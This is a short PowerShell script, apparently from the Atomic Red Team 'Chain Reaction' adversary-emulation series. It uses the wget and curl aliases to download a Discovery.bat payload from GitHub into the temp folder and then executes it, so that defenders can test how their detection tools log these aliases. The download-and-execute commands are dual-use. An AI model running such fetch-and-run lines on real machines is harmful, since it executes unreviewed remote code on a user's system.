# Chain Reaction: Argonaut
# Tactics: Execution:Powershell, Discovery

# variable can be changed to $userprofile to drop the bat elsewhere
# TEMP=C:\Users\<username>\AppData\Local\Temp
$temp = $env:temp

# Note that these are alias' for Invoke-WebRequest.
# The concept is to see how curl and wget look in you detection tools vs what is commonly used (IWR, Invoke-WebRequest, etc)

wget https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat -OutFile $temp\1.bat

# Alternate Ending: Using curl

curl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat -OutFile $temp\2.bat

# Execute the 1.bat file

cmd.exe /c $temp\1.bat
